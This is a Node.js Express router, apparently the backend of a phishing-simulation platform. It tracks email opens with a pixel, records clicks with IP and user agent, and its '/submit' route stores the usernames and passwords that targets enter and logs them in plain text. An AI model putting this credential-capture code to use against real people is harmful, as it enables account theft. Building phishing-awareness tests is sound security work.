const express = require('express');
const router = express.Router();
const { CampaignResult, Campaign, sequelize } = require('../models');

// Adjust this if your frontend runs on a different port (e.g., 3000)
const FRONTEND_URL = process.env.FRONTEND_URL || 'http://localhost:8080';

// Track email open (via 1x1 pixel or direct call) - Changed to GET for pixel
router.get('/track-open', async (req, res) => { // Changed to GET
  try {
    const { token } = req.query; // Changed to req.query for GET
    if (!token) {
      // For a pixel, you might not send a JSON error, but a transparent pixel back
      // For now, let's keep it consistent for debugging
      return res.status(400).json({ message: 'Token required' });
    }
    
    const result = await CampaignResult.findOne({ where: { unique_token: token } });
    if (result) {
      if (!result.email_opened) { // Mark as opened only once
        result.email_opened = true;
        result.opened_at = new Date(); // Use new Date()
        await result.save();
      }
    }
    // Respond with a 1x1 transparent pixel for tracking images
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, {
      'Content-Type': 'image/gif',
      'Content-Length': pixel.length
    });
    res.end(pixel);

  } catch (error) {
    console.error('Error tracking email open:', error);
    // For pixel, avoid sending 500 error HTML. Log and send pixel.
    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.writeHead(200, { // Still send 200 to not break image loading
      'Content-Type': 'image/gif',
      'Content-Length': pixel.length
    });
    res.end(pixel);
  }
});

// Track link click
router.post('/track-click', async (req, res) => {
  try {
    const { token } = req.body; // user_agent can be sent from client
    if (!token) {
      return res.status(400).json({ success: false, message: 'Token required' });
    }
    
    const result = await CampaignResult.findOne({ where: { unique_token: token } });
    if (!result) {
      return res.status(404).json({ success: false, message: 'Invalid tracking token' });
    }
    
    // Mark as opened if not already (since clicking implies opening)
    if (!result.email_opened) {
        result.email_opened = true;
        result.opened_at = new Date();
    }

    if (!result.link_clicked) { // Mark as clicked only once
        result.link_clicked = true;
        result.clicked_at = new Date();
        result.user_agent = req.body.user_agent || req.get('User-Agent'); // Get from body or header
        result.ip_address = req.ip; // Express provides req.ip
        await result.save();
    } else {
        // If already clicked, still update user_agent and ip_address if they changed or are more accurate now
        result.user_agent = req.body.user_agent || req.get('User-Agent') || result.user_agent;
        result.ip_address = req.ip || result.ip_address;
        await result.save();
    }
    
    res.json({ success: true, message: 'Link click tracked.' });
  } catch (error) {
    console.error('Error tracking link click:', error);
    res.status(500).json({ success: false, message: 'Error tracking link click' });
  }
});

router.post('/submit', async (req, res) => {
  console.log('[BACKEND LOG] /api/phishing/submit received request.');
  console.log('[BACKEND LOG] Request body:', req.body); // Log the entire request body

  try {
    const { token, username, password } = req.body;

    if (!token) {
      console.error('[BACKEND LOG] Token is missing in req.body for /submit');
      return res.status(400).json({ success: false, message: 'Token required' });
    }
    
    const result = await CampaignResult.findOne({ where: { unique_token: token } });
    if (!result) {
      console.error(`[BACKEND LOG] Invalid tracking token received: ${token}`);
      return res.status(404).json({ success: false, message: 'Invalid tracking token' });
    }
    
    // Mark as opened if not already (since submitting implies clicking and opening)
    if (!result.email_opened) {
        result.email_opened = true;
        result.opened_at = new Date();
    }
    if (!result.link_clicked) {
        result.link_clicked = true;
        result.clicked_at = new Date();
        // Capture user_agent and ip_address here if not already captured by track-click
        result.user_agent = result.user_agent || req.body.user_agent || req.get('User-Agent');
        result.ip_address = result.ip_address || req.ip;
    }

    if (!result.credentials_submitted) {
        result.credentials_submitted = true;
        result.submitted_at = new Date();
        result.captured_username = username;
        result.captured_password = password;
        await result.save();
        console.log(`[BACKEND LOG] Credentials submitted successfully for token: ${token}`);
    } else {
        console.log(`[BACKEND LOG] Credentials already submitted for token: ${token}`);
    }
    
    res.json({ success: true, message: 'Credentials submitted successfully.' });
  } catch (error) {
    console.error('[BACKEND LOG] Error capturing credentials:', error);
    res.status(500).json({ success: false, message: 'Error capturing credentials' });
  }
});

// Test route - keep this for sanity checks
router.get('/test-phishing-route', (req, res) => {
  // console.log('[LOG /api/phishing/test-phishing-route] Route was hit!');
  res.send('Phishing API test route successful!');
});

module.exports = router;